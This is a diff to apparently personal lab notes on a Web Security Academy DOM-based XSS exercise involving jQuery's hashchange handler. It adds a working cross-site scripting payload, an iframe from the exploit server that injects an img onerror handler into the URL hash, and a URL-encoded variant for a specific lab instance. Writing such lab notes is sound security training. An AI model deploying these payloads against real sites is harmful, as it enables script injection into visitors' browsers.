@@ -91,6 +91,8 @@ $(window).on('hashchange', function(){
 
 ![image](https://github.com/user-attachments/assets/db5f97f0-7973-4a81-acae-3f42a0f8b015)
 
+- Navigate to the exploit server and utilize the following payload: `<iframe src="https://YOUR-LAB-ID.web-security-academy.net/#" onload="this.src+='<img src=x onerror=print()>'"></iframe>`
+  - You can test this in the browser first by appending to #. `https://0a8100e00497972383af15d5009a0094.web-security-academy.net/#'%3Cimg%20src=7%20onerror=print()%3E'`
    
 ## Miscellaneous Notes
 - Chrome version 92 onward, cross-origin iframes are prevented from calling `alert()`. PoC payload needs to be altered, so using something like print() function.
